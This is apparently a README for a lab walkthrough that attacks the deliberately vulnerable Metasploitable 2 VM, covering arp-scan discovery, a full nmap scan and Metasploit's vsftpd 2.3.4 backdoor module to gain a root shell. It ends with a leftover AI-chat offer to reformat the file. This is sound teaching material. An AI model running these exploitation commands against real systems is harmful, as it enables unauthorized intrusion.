[readme.md](https://github.com/user-attachments/files/23171044/readme.md)
# Metasploitable 2





**Metasploitable 2** is a deliberately vulnerable Linux virtual machine designed for beginners to practice penetration testing skills. The challenges included are straightforward and provide a solid foundation for learning offensive security techniques.

---

## Table of Contents

- [Description](#description)
- [Prerequisites](#prerequisites)
- [Getting started](#getting-started)
- [Finding the target IP](#finding-the-target-ip)
- [Scanning](#scanning)
  - [ARP scan](#arp-scan)
  - [Nmap scan](#nmap-scan)
  - [Nmap options explained](#nmap-options-explained)
- [Enumeration: FTP (vsftpd 2.3.4)](#enumeration-ftp-vsftpd-234)
- [Exploitation (Metasploit)](#exploitation-metasploit)
- [Post-exploitation](#post-exploitation)
- [Conclusion](#conclusion)
- [Responsible use](#responsible-use)
- [Credits](#credits)

---

## Description

This guide documents a simple walkthrough of attacking a Metasploitable 2 VM from an attack machine (Kali Linux) running in the same hypervisor (VMware Workstation). It covers finding the target on the LAN, scanning for open ports and services, identifying a vulnerable service (vsftpd 2.3.4), and exploiting it using Metasploit.

## Prerequisites

- An attack machine (Kali Linux) and the Metasploitable 2 VM running in your hypervisor (VMware Workstation used here).
- Network connectivity between the attack machine and the target (use Host-only or NAT depending on your setup).
- Tools used:
  - `arp-scan`
  - `nmap`
  - `msfconsole` (Metasploit Framework)

## Getting started

1. Boot your Metasploitable 2 VM and your attack machine (Kali Linux).
2. Log in to the Metasploitable 2 VM with the default credentials:

```text
username: msfadmin
password: msfadmin
```

3. On the Metasploitable machine, discover its IP address (this step is optional if you prefer to discover it from the attacker machine):

```bash
ifconfig   # or: ip addr show
```

> In this guide we discover the target IP from the attack machine using `arp-scan`.

## Finding the target IP

Scan the local network to find hosts and their IPs:

```bash
sudo arp-scan -l
```

Look for the IP address that corresponds to the Metasploitable VM. Note that your network interface (and the network range) may differ depending on VMware settings.

## Scanning

After you have the target IP, perform a full port/service/OS scan using `nmap` from the attack machine.

### ARP scan

(Already shown above) `arp-scan -l` lists active hosts on the LAN and helps you find the Metasploitable IP.

### Nmap scan

Run an aggressive, full-port scan and save results to a file:

```bash
nmap -p- -v -sT -sV -O -oN Temp.xml <target_ip>
```

Replace `<target_ip>` with the IP you found using `arp-scan`.

### Nmap options explained

- `-p-` : scan all 65,535 TCP ports
- `-v`  : verbose output
- `-sT` : TCP connect scan (useful when raw sockets are not available)
- `-sV` : probe open ports to determine service and version information
- `-O`  : attempt to determine the target operating system
- `-oN Temp.xml` : save output to `Temp.xml` (note: the extension here is `.xml` but `-oN` writes normal text format; change to `-oX` for real XML)

After the scan completes you will see a list of open ports and services. Metasploitable 2 typically presents many open services — each is a potential attack vector.

## Enumeration: FTP (vsftpd 2.3.4)

From the scan results, FTP (port 21) often shows up with the service `vsftpd 2.3.4`. This specific version is known to have a malicious backdoor in certain Metasploitable builds and earlier vulnerable distributions.

Research the specific service/version (e.g., search exploit databases) to see if there are public exploits available for that version.

## Exploitation (Metasploit)

Metasploit includes a module for the `vsftpd 2.3.4` backdoor. The basic steps to exploit using Metasploit are shown below.

```bash
msfconsole
search vsftpd 2.3.4

# If found:
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS <target_ip>
set RPORT 21         # optional if different
exploit
```

Replace `<target_ip>` with the target's IP. After running `exploit` you should receive a shell from the target.

## Post-exploitation

Once you have a shell, verify privileges:

```bash
whoami
```

If the exploit gives you a root shell (as commonly happens with this vuln in Metasploitable 2), `whoami` will return `root`.

From here you can explore the filesystem, inspect `/etc/passwd`, check for other services, and practice post-exploitation enumeration in a safe, legal lab environment.

## Conclusion

This walkthrough demonstrated a simple, classic attack path in Metasploitable 2:

1. Discover the target on the LAN (`arp-scan`).
2. Scan the target for open ports and identify services (`nmap`).
3. Research identified services (vsftpd 2.3.4) for known vulnerabilities.
4. Exploit the vulnerable service with Metasploit and obtain a shell.

This is intentionally simplified for learning purposes. Real-world engagements require far more careful reconnaissance, planning, and legality checks.

## Responsible use

**Important:** These techniques are for learning and testing only. Do **not** use them against systems you do not own or do not have explicit authorization to test. Unauthorized access to computer systems is illegal and unethical.

## Credits

- Metasploit Framework
- Metasploitable project (Intended for defensive and educational use)

---

*If you want, I can convert this to a ******`README.md`****** file in your repo format, add badges (e.g., ******`linux`******, ******`vulnerable`******), or include screenshots and commands output snapshots. Just tell me what you'd like next.*

